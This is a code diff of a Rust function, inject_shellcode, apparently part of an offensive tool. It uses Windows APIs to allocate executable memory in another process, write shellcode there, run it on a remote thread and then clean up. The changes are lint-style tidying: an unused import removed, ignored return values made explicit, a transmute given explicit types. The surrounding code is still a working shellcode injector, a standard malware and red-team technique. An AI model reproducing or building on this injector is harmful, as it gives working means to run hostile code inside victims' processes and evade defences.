@@ -1,4 +1,4 @@
-use windows::core::{Error, Result, HRESULT};
+use windows::core::{Error, Result};
 use windows::Win32::Foundation::{CloseHandle, E_INVALIDARG, HANDLE, WAIT_OBJECT_0};
 use windows::Win32::System::Memory::{
     VirtualAllocEx, VirtualFreeEx, MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, PAGE_EXECUTE_READWRITE,
@@ -38,7 +38,7 @@ pub fn inject_shellcode(handle: HANDLE, shellcode: &[u8]) -> Result<()> {
     };
 
     if write_result.is_err() || bytes_written != shellcode.len() {
-        unsafe { VirtualFreeEx(handle, remote_memory, 0, MEM_RELEASE) };
+        let _ = unsafe { VirtualFreeEx(handle, remote_memory, 0, MEM_RELEASE) };
         return Err(Error::from_thread());
     }
 
@@ -48,7 +48,10 @@ pub fn inject_shellcode(handle: HANDLE, shellcode: &[u8]) -> Result<()> {
             handle,
             None,
             0,
-            Some(std::mem::transmute(remote_memory)),
+            Some(std::mem::transmute::<
+                *mut std::ffi::c_void,
+                unsafe extern "system" fn(*mut std::ffi::c_void) -> u32,
+            >(remote_memory)),
             None,
             0,
             None,
@@ -59,7 +62,7 @@ pub fn inject_shellcode(handle: HANDLE, shellcode: &[u8]) -> Result<()> {
     let thread_handle = match thread_handle {
         Ok(handle) => handle,
         Err(e) => {
-            unsafe { VirtualFreeEx(handle, remote_memory, 0, MEM_RELEASE) };
+            let _ = unsafe { VirtualFreeEx(handle, remote_memory, 0, MEM_RELEASE) };
             return Err(e);
         }
     };
@@ -67,18 +70,14 @@ pub fn inject_shellcode(handle: HANDLE, shellcode: &[u8]) -> Result<()> {
     // Wait for thread completion
     let wait_result = unsafe { WaitForSingleObject(thread_handle, INFINITE) };
     if wait_result != WAIT_OBJECT_0 {
-        unsafe {
-            let _ = CloseHandle(thread_handle);
-            VirtualFreeEx(handle, remote_memory, 0, MEM_RELEASE);
-        }
+        let _ = unsafe { CloseHandle(thread_handle) };
+        let _ = unsafe { VirtualFreeEx(handle, remote_memory, 0, MEM_RELEASE) };
         return Err(Error::from_thread());
     }
 
     // Cleanup resources
-    unsafe {
-        let _ = CloseHandle(thread_handle);
-        VirtualFreeEx(handle, remote_memory, 0, MEM_RELEASE);
-    }
+    let _ = unsafe { CloseHandle(thread_handle) };
+    let _ = unsafe { VirtualFreeEx(handle, remote_memory, 0, MEM_RELEASE) };
 
     Ok(())
 }
